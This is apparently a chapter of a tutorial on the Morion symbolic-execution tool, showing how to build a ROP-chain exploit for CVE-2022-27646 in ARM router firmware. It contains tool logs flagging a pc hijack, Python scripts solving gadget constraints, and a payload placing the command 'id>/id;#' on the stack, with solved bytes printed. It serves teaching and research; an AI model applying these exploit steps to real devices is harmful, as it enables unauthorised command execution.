# Table of Contents
1. [Setup](./1_setup.md)
2. [Emulation](./2_emulation.md)
3. [Vulnerability CVE-2022-27646](./3_vulnerability.md)
4. [Tracing](./4_tracing.md)
5. [Symbolic Execution](./5_symbex.md)
6. [Exploitation](./6_exploitation.md#exploitation)
<!--TODO--------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------->
# Exploitation
<figure>
  <img src="../images/Memory_Layout-PoV.svg" alt="Memory Layout PoV"/>
  <figcaption>
    Fig. 1: Memory Layout - Showing the stack layout for the proof-of-vulnerability (PoV) payload.
  </figcaption>
</figure>

<figure>
  <img src="../images/ROP_Chain.svg" alt="ROP Chain"/>
  <figcaption>
    Fig. 2: ROP Chain - Showing ...
  </figcaption>
</figure>

## Manual

`morion_control_hijacker --skip_state_analysis circled.yaml`:
```
[...]
[2024-04-10 14:44:53] [DEBG] 0x0000cf1c (ff df 8d e2): add sp, sp, #0x3fc      #
[2024-04-10 14:44:53] [DEBG] 0x0000cf20 (03 db 8d e2): add sp, sp, #0xc00      #
[2024-04-10 14:44:53] [DEBG] 0x0000cf24 (f0 8f bd e8): pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}#                                                 
[...]
[2024-04-10 14:45:01] [WARN] [POST] Potential control hijack due to unrestricted register 'pc'.

                      _                   _          _ _ 
 _ __ ___   ___  _ __(_) ___  _ __    ___| |__   ___| | |
| '_ ` _ \ / _ \| '__| |/ _ \| '_ \  / __| '_ \ / _ \ | |
| | | | | | (_) | |  | | (_) | | | | \__ \ | | |  __/ | |
|_| |_| |_|\___/|_|  |_|\___/|_| |_| |___/_| |_|\___|_|_|
            
Investigate potential control hijack...

Available objects:
- ctx
- ast

Type quit(), exit() or ctrl-d to leave the interpreter.

In [1]: run -i circled.rop1.py
{
  392:  i: 5132,  m: 0xbeffc24c [MODEL:fgets@libc:s+392]:8 = 0xb8,
  393:  i: 5132,  m: 0xbeffc24d [MODEL:fgets@libc:s+393]:8 = 0xc9,
  394:  i: 5132,  m: 0xbeffc24e [MODEL:fgets@libc:s+394]:8 = 0x00,
  395:  i: 5132,  m: 0xbeffc24f [MODEL:fgets@libc:s+395]:8 = 0x00
}

In [2]: run -i circled.rop2.py
{
  368:  i: 5132,  m: 0xbeffc234 [MODEL:fgets@libc:s+368]:8 = 0x90
  369:  i: 5132,  m: 0xbeffc235 [MODEL:fgets@libc:s+369]:8 = 0xc2,
  370:  i: 5132,  m: 0xbeffc236 [MODEL:fgets@libc:s+370]:8 = 0xff,
  371:  i: 5132,  m: 0xbeffc237 [MODEL:fgets@libc:s+371]:8 = 0xbe,
  392:  i: 5132,  m: 0xbeffc24c [MODEL:fgets@libc:s+392]:8 = 0xb8,
  393:  i: 5132,  m: 0xbeffc24d [MODEL:fgets@libc:s+393]:8 = 0xc9,
  394:  i: 5132,  m: 0xbeffc24e [MODEL:fgets@libc:s+394]:8 = 0x00,
  395:  i: 5132,  m: 0xbeffc24f [MODEL:fgets@libc:s+395]:8 = 0x00,
  1483: i: 15451, m: 0xbeffc290 [MODEL:fgets@libc:s+460]:8 = 0x69,
  1484: i: 15451, m: 0xbeffc291 [MODEL:fgets@libc:s+461]:8 = 0x64,
  1485: i: 15451, m: 0xbeffc292 [MODEL:fgets@libc:s+462]:8 = 0x3e,
  1486: i: 15451, m: 0xbeffc293 [MODEL:fgets@libc:s+463]:8 = 0x2f,
  1487: i: 15451, m: 0xbeffc294 [MODEL:fgets@libc:s+464]:8 = 0x69,
  1488: i: 15451, m: 0xbeffc295 [MODEL:fgets@libc:s+465]:8 = 0x64,
  1489: i: 15451, m: 0xbeffc296 [MODEL:fgets@libc:s+466]:8 = 0x3b,
  1490: i: 15451, m: 0xbeffc297 [MODEL:fgets@libc:s+467]:8 = 0x23,
  1491: i: 15451, m: 0xbeffc298 [MODEL:fgets@libc:s+468]:8 = 0x00,
  1492: i: 15451, m: 0xbeffc299 [MODEL:fgets@libc:s+469]:8 = 0x00,
  1493: i: 15451, m: 0xbeffc29a [MODEL:fgets@libc:s+470]:8 = 0x00,
  1494: i: 15451, m: 0xbeffc29b [MODEL:fgets@libc:s+471]:8 = 0x00,
  1495: i: 15451, m: 0xbeffc29c [MODEL:fgets@libc:s+472]:8 = 0x00,
  1496: i: 15451, m: 0xbeffc29d [MODEL:fgets@libc:s+473]:8 = 0x00,
  1497: i: 15451, m: 0xbeffc29e [MODEL:fgets@libc:s+474]:8 = 0x00,
  1498: i: 15451, m: 0xbeffc29f [MODEL:fgets@libc:s+475]:8 = 0x00
}
```

[circled.rop1.py](../morion/circled.rop1.py):
```
[...]
# Preconditions gadget 0
g0_sp_val  = ctx.getConcreteRegisterValue(ctx.registers.sp)-9*4
g0_pc_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+8*4, 4))
g0_pc_val  = 0xc9b8

# Solve preconditions
model = ctx.getModel(g0_pc_ast  == g0_pc_val)
pprint(model)
```
[circled.rop2.py](../morion/circled.rop2.py):
```
[...]
# OS command
md5_sum_len = 32
cmd         = "id>/id;#"
cmd_addr    = 0xbeffc104+396

# Preconditions gadget 0
g0_sp_val  = ctx.getConcreteRegisterValue(ctx.registers.sp)-9*4
g0_pc_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+8*4, 4))
g0_pc_val  = 0xc9b8
g0_r6_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+2*4, 4))
g0_r6_val  = cmd_addr
g0__r6_ast = ctx.getMemoryAst(MemoryAccess(cmd_addr, 16))
g0__r6_val = int.from_bytes(bytes(cmd, "UTF-8"), byteorder="little")

# Solve preconditions
model = ctx.getModel(ast.land([
                g0_pc_ast  == g0_pc_val,
                g0_r6_ast  == g0_r6_val,
                g0__r6_ast == g0__r6_val,
            ]))
pprint(model)
```

## Analysis Module morion_rop_generator

## Todo
- Note: The shown exploit could easily be generated without using symbolic execution. However, we
    have chosen it since it is rather easy to follow along and suitable to explain how Morion works.

----------------------------------------------------------------------------------------------------
[Back-to-Top](./6_exploitation.md#table-of-contents)